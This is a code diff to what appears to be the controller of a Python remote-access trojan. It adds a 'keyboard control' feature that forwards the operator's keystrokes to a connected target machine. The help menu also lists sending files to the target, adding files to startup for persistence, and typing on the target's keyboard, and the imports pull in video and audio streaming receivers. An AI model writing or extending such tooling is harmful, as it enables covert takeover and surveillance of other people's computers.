@@ -1,3 +1,4 @@
+from pynput.keyboard import Key, Listener;
 from vidstream import StreamingServer;
 from vidstream import AudioReceiver;
 from datetime import datetime;
@@ -161,6 +162,23 @@ def connect():
             conn.send(command.encode('utf-8'));
             print(conn.recv(1024).decode('utf-8'));
             continue;
+        elif 'keyboard control' in command:
+            conn.send(command.encode('utf-8'));
+            print(conn.recv(1024).decode('utf-8'));
+            global stop;
+            stop = 0;
+            def on_press(key):
+                if key == Key.insert:
+                    listener.stop();
+                    conn.send(f'stop'.encode('utf-8'));
+                else:    
+                    conn.send(f'{key}'.encode('utf-8'));
+            with Listener(on_press=on_press) as listener:
+                    listener.join();
+            continue;
+        elif 'quit' in command:
+            break;
+            continue;
         elif 'rhelp' in command:
             print('''
                     1. send <file name> --> send files to target computer.
@@ -175,7 +193,9 @@ def connect():
                     10. terminate --> close the connection.
                     11. startup <file name> --> add a file at startup.
                     12. keyborad type <text> --> type a text on the target's computer keyboard.
-                    13. rhelp --> show this message.
+                    13. keyboard control --> controls target keyboard.
+                    14. quit --> ends the program.
+                    15. rhelp --> show this message.
                   ''');
             continue;
         conn.send(command.encode('utf-8', errors='ignore'));
